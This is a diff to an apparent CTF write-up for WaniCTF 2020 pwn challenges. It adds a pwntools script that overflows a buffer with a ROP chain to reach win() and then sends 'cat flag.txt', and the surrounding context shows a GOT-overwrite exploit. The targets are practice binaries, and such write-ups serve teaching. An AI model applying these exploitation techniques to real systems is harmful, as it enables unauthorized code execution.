@@ -135,7 +135,7 @@ log.success("FLAG{%s", io.recvuntil(b"}"))
 io.close()
 ```
 
-# 04-got-rewriter
+## 04-got-rewriter
 
 - https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/04-got-rewriter
 
@@ -155,5 +155,27 @@ printf_got = exe.got.printf
 log.info("printf@got:\t0x%016x", printf_got)
 io.sendlineafter(b"0x6010b0): ", hex(printf_got).encode())
 io.sendlineafter(b"rewrite value: ", hex(win_addr).encode())
+io.interactive()
+```
+
+## 05-ret-rewrite
+
+- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/05-ret-rewrite
+
+```python
+#!/usr/bin/env python3
+from pwn import ELF, ROP, args, context, log, flat, remote, process
+# context.log_level = "debug"
+exe = context.binary = ELF("./pwn05", checksec=False)
+if args.REMOTE:
+    io = remote("::1", 9005)
+else:
+    io = process(exe.path)
+rop = ROP(exe)
+rop.raw(rop.ret)
+rop.win()
+log.info("rop:\n%s", rop.dump())
+io.sendlineafter(b"What's your name?: ", flat(b"A"*14, b"B"*8, rop))
+io.sendlineafter(b"congratulation!", b"cat flag.txt")
 io.interactive()
 ```
